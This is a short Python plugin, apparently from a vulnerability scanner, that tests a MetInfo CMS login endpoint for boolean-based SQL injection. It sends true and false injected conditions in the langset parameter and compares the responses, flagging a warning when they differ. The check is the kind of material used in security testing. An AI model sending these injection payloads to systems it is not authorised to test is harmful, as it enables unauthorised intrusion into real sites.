#!/usr/bin/python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2015-0100846

def assign(service, arg):
    if service == "metinfo":
        return True, arg

def audit(url):
    import urllib2
    true_url = url + "admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='1")
    false_url =url + "admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='2")

    code1, head1,res1, errcode1, _ = curl.curl2(true_url)
    code2, head2,res2, errcode2, _ = curl.curl2(false_url)
    
    if 'not have this language' in res2 and  'not have this language' not in res1:
        security_warning(true_url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://192.168.1.113/')[1])